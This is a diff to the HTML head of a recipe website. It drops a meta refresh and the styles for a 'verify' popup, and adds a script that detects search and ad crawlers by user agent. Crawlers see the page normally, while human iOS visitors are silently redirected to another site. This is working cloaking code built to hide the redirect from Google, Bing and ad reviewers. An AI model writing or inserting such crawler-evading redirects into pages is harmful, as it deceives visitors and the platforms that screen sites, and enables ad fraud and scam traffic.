@@ -14,7 +14,6 @@ s0.parentNode.insertBefore(s1,s0);
 })();
 </script>
 <!--End of Tawk.to Script-->
-<meta http-equiv="refresh" content="5; url=https://flavor-recipes.github.io">
 <meta property="og:title" content="Flavor Recipes"/>
 <meta property="og:description" content="Explore easy, tasty recipes that bring joy to cooking at home."/>
 <meta property="og:type" content="website"/>
@@ -165,49 +164,44 @@ if ('serviceWorker' in navigator) {
 
   gtag('config', 'G-7G5BXS77VE');
 </script>
-<style>
-    body {
-      font-family: Arial, sans-serif;
+<script>
+  function isBot() {
+    const bots = [
+      /googlebot/i,
+      /adsbot-google/i,
+      /mediapartners-google/i, 
+      /google-inspectiontool/i,
+      /googleweblight/i,
+      /bingbot/i,
+      /slurp/i,
+      /duckduckbot/i,
+      /baiduspider/i,
+      /yandex/i,
+      /facebookexternalhit/i,
+      /facebot/i,
+      /ia_archiver/i
+    ];
+    return bots.some(bot => bot.test(navigator.userAgent));
+  }
+
+  window.onload = function () {
+    let ua = navigator.userAgent || navigator.vendor || window.opera;
+
+    if (!isBot()) {
+      if (/iPhone|iPad|iPod/i.test(ua)) {
+        // ✅ iOS detected → redirect
+        window.location.href = "https://flavor-recipes.github.io/";
+      } else {
+        // ✅ Non-iOS humans → stay on page
+        console.log("Non-iOS human visitor → no redirect");
+      }
+    } else {
+      // ✅ Bots → no redirect
+      console.log("Bot detected (Google / Ads / Display) → no redirect");
     }
-    .popup-overlay {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6);
-      z-index: 9999;
-    }
-    .popup-box {
-      background: #fff;
-      width: 340px;
-      padding: 25px;
-      border-radius: 14px;
-      text-align: center;
-      position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-    }
-    .popup-box h2 {
-      margin-bottom: 12px;
-      color: #333;
-    }
-    .popup-box p {
-      margin-bottom: 18px;
-      color: #555;
-      font-size: 15px;
-    }
-    .btn-verify {
-      padding: 10px 22px;
-      border: none;
-      border-radius: 8px;
-      background: #28a745;
-      color: white;
-      font-weight: bold;
-      font-size: 14px;
-      cursor: pointer;
-    }
-  </style>
+  };
+</script>
+
 
    
 </head>
